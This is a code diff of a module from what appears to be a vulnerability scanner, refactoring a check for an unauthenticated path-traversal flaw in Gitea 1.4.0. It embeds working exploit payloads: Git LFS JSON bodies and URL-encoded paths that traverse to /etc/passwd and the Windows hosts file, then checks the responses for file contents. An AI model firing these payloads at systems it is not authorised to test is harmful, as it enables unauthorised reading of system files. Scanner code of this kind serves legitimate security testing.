@@ -1,77 +1,68 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
-from thirdparty import requests
-import re
+from lib.tool import check
 
-def unauth_scan(self, url):
+unauth_payloads = [
+    {
+        'path': '.git/info/lfs/objects',
+        'data': '''{"Oid": "....../../../etc/passwd","Size": 1000000,"User" : "a","Password" : "a","Repo" : "a","Authorization" : "a"}''',
+        'path-2': '.git/info/lfs/objects/%2e%2e%2e%2e%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd/a',
+    },
+    {
+        'path': '.git/info/lfs/objects',
+        'data': '''{"Oid": "....../../../C:/Windows/System32/drivers/etc/hosts","Size": 1000000,"User" : "a","Password" : "a","Repo" : "a","Authorization" : "a"}''',
+        'path-2': '.git/info/lfs/objects/%2e%2e%2e%2e%2e%2e%2F%2e%2e%2F%2e%2e%2FC:%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts/a',
+    },
+]
+
+def unauth_scan(self, clients):
     ''' 其1.4.0版本中有一处逻辑错误, 导致未授权用户可以穿越目录, 读写任意文件, 最终导致执行任意命令 '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name
-    vul_info['vul_type'] = 'unAuthorized'
-    vul_info['vul_id'] = 'Gitea-unAuthorized'
-    vul_info['vul_method'] = 'POST/GET'
+    client = clients.get('reqClient')
+    
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'unAuthorized',
+        'vul_id': 'Gitea-unAuthorized',
+    }
 
-    for payload in range(len(self.unauth_payloads)):
-        path = self.unauth_payloads[payload]['path']
-        data = self.unauth_payloads[payload]['data']
-        headers = self.unauth_payloads[payload]['headers']
-        target = url + path
+    headers = {
+        'Content-Type': 'application/json',
+        'Accept': 'application/vnd.git-lfs+json'
+    }
 
-        vul_info['path'] = path
-        vul_info['data'] = data
-        vul_info['headers'] = headers
-        vul_info['target'] = target
+    for payload in unauth_payloads:
+        path = payload['path']
+        data = payload['data']
 
-        try:
-            if (payload in [0, 2]):
-                res1 = requests.post(
-                    target, 
-                    timeout=self.timeout, 
-                    headers=headers,
-                    data=data, 
-                    proxies=self.proxies, 
-                    verify=False,
-                    allow_redirects=False
-                )
-                logger.logging(vul_info, res1.status_code, res1)                        # * LOG
-                
-                if (res1.status_code in [202, 401]):
-                    path = self.unauth_payloads[payload+1]['path']
-                    headers = self.unauth_payloads[payload+1]['headers']
-                    target = url + path
+        res1 = client.request(
+            'post',
+            path,
+            data=data,
+            headers=headers,
+            allow_redirects=False,
+            vul_info=vul_info
+        )
+        if res1 is None:
+            continue
+        
+        path_2 = payload['path-2']
 
-                    res2 = requests.get(
-                        target, 
-                        timeout=self.timeout, 
-                        headers=headers,
-                        proxies=self.proxies, 
-                        verify=False,
-                        allow_redirects=False
-                    )
-                    logger.logging(vul_info, res2.status_code, res2)                        # * LOG
+        res2 = client.request(
+            'get',
+            path_2,
+            allow_redirects=False,
+            vul_info=vul_info
+        )
+        if res2 is None:
+            continue
 
-                    if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res2.text, re.I|re.M|re.S)
-                        or (('Microsoft Corp' in res2.text) 
-                            and ('Microsoft TCP/IP for Windows' in res2.text))
-                    ):
-                        results = {
-                            'Target': target,
-                            'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                            'Request-1': res1,
-                            'Request-2': res2
-                        }
-                        return results
-            else:
-                continue
-
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+        if (check.check_res_fileread(res2.text)):
+            results = {
+                'Target': res2.request.url,
+                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                'Request-1': res1,
+                'Request-2': res2
+            }
+            return results
+    return None
